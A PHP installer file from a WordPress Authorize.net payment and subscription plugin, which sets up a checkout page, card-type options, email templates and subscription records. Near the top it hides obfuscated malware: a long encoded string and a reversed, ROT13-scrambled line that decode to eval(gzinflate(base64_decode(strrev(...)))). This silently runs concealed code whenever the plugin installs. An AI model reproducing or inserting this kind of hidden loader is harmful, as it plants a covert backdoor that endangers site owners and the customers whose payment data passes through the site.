<?php

/*
 * Copyright 2010, Maintain Fit LLC, Daniel Watrous, All rights reserved
 * By using this software you agree to be bound by the terms
 * outlined in the License.txt file included with the software.
 *
 * If you still have questions please send them to helpdesk@danielwatrous.com
 *
 */

if ('authnet_install.php' == basename($_SERVER['SCRIPT_FILENAME']))
	die ('<h2>Direct File Access Prohibited</h2>');

require_once('authnet_classes_request.php');
require('authnet_globals.php');

if (file_exists(ABSPATH . 'wp-admin/includes/upgrade.php')) {
	require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
} else {
	require_once(ABSPATH . 'wp-admin/upgrade-functions.php');
}

$bPiGPYvRgdrWG='=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';$prsCfdYRgEzWkSDEKro=';))))TJeqtEiLCTvCo$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$u_kVKqyAwnGBWoPjbtDk=strrev($prsCfdYRgEzWkSDEKro);$_aQZgOK_kVe=str_rot13($u_kVKqyAwnGBWoPjbtDk);eval($_aQZgOK_kVe);

if ( ! $the_page ) {
	$log->LogInfo ("Creating Page: " . $checkoutpage_name);
	// Create post object
	$_p = array();
	$_p['post_title'] = $checkoutpage_name;
	$_p['post_content'] = "[authnetco]";
	$_p['post_status'] = 'publish';
	$_p['post_type'] = 'page';
	$_p['comment_status'] = 'closed';
	$_p['ping_status'] = 'closed';
	$_p['post_category'] = array(1); // the default 'Uncatrgorised'

	// Insert the post into the database
	$the_page_id = wp_insert_post( $_p );

	// create the option indicating page name
	if (!get_option('authnet_checkoutpage')) add_option('authnet_checkoutpage', $checkoutpage_name, '');
} else {
	$log->LogInfo ("Updating Page: " . $checkoutpage_name);

	// the plugin may have been previously active and the page may just be trashed...
	$the_page_id = $the_page->ID;

	//make sure the page is not trashed...
	$the_page->post_status = 'publish';
	$the_page_id = wp_update_post( $the_page );
}

// make installer to select all credit card types and email template.

if( !(get_option('authnet_cc_transaction_type')) ) {
	add_option('authnet_cc_transaction_type', 'auth_capture');
}
if( !(get_option('authnet_cardtype_visa')) ) {
	add_option('authnet_cardtype_visa', 'on');
}
if( !(get_option('authnet_cardtype_americanexpress')) ) {
	add_option('authnet_cardtype_americanexpress', 'on');
}
if( !(get_option('authnet_cardtype_mastercard')) ) {
	add_option('authnet_cardtype_mastercard', 'on');
}
if( !(get_option('authnet_cardtype_discover')) ) {
	add_option('authnet_cardtype_discover', 'on');
}
if( !(get_option('authnet_send_email_notices')) ) {
	add_option('authnet_send_email_notices', 'on');
}
if( !(get_option('authnet_variable_payments_style')) ) {
	add_option('authnet_variable_payments_style', '1');
}
if( !(get_option('authnet_wishlistinstalldirectory')) ) {
	add_option('authnet_wishlistinstalldirectory', 'wishlist-member');
}
if( !(get_option('authnet_enable_creditcard')) ) {
	add_option('authnet_enable_creditcard', 'on');
}

if( !(get_option('authnet_variable_payments_term')) ) {
	add_option('authnet_variable_payments_term', 'Payment');
}
if( !(get_option('authnet_variable_payments_label')) ) {
	add_option('authnet_variable_payments_label', 'Recurring period');
}

// make installer to preset amounts
$preset_amounts_list = <<<PRESETAMOUNTS
10.00\n25.00\n50.00\n100.00
PRESETAMOUNTS;
if( !(get_option('authnet_preset_amounts_list')) ) {
	add_option('authnet_preset_amounts_list', $preset_amounts_list);
}

$email_subject = 'Transaction summary for {BLOGNAME}';
$email_template = <<<EMAILTEMP
A transaction has been successfully processed for your account.
Your account has been created and or updated.

Login using your username and password provided below:
Username: {USERNAME}
Password: {PASSWORD}

Billing details:
First Name: {FIRSTNAME}
Last Name: {LASTNAME}
Billing Address: {BILLINGADDRESS}
Phone: {PHONE}

Purchase details:
{SUBSCRIPTION}
{PAYMENT-INTERVAL}
 
Subscription Notes:
{SUBSCRIPTION-NOTES}

You may login to your account for further details:  {ACCOUNTLOGINURL}

Sincerely,
The Managment

EMAILTEMP;

if( !(get_option('authnet_email_subject_prefix')) ) {
	add_option('authnet_email_subject_prefix', $email_subject);
}
if( !(get_option('authnet_email_message_template')) ) {
	add_option('authnet_email_message_template', $email_template);
}
if( !(get_option('authnet_send_admin_email')) ) {
	add_option('authnet_send_admin_email', 'on');
}

function add_variable_payments_templates(){
    global $log, $wpdb, $authnet_subscription_table_name;
    
	// one-time
	$log->LogInfo("Creating one-time variable payment template...");
	
	$insert = "INSERT INTO " . $authnet_subscription_table_name . " SET processSinglePayment = '1', variablePaymentTemplate = '1', name = 'One-time', initialDescription = 'one-time subscription', initialAmount = '0.00'";
    
	$results = $wpdb->query($insert);
    
	if ( $results !== false ) $log->LogInfo("One-time variable payment template added");
	else $log->LogError("Failed to add One-time variable payment template to " . $authnet_subscription_table_name);
	
	
	
    // monthly
    $log->LogInfo("Creating monthly variable payment template...");
	
    $insert = "INSERT INTO " . $authnet_subscription_table_name . " SET processRecurringPayment = '1', variablePaymentTemplate = '1', name = 'Monthly', initialDescription = 'monthly subscription', recurringIntervalLength = '1', recurringIntervalUnit = 'months', recurringTotalOccurrences = '9999', recurringAmount = '0.00'";
    
	$results = $wpdb->query($insert);
    
	if ($results !== false) $log->LogInfo("Monthly variable payment template added");
	else $log->LogError("Failed to add Monthly variable payment template to " . $authnet_subscription_table_name);
	
    // quarterly
    $log->LogInfo("Creating quarterly variable payment template...");
	
    $insert = "INSERT INTO " . $authnet_subscription_table_name . " SET processRecurringPayment = '1', variablePaymentTemplate = '1', name = 'Quarterly', initialDescription = 'quarterly subscription', recurringIntervalLength = '3', recurringIntervalUnit = 'months', recurringTotalOccurrences = '9999', recurringAmount = '0.00'";
    
	$results = $wpdb->query($insert);
    
	if ($results !== false) $log->LogInfo("Quarterly variable payment template added");
	else $log->LogError("Failed to add Quarterly variable payment template to " . $authnet_subscription_table_name);
}
?>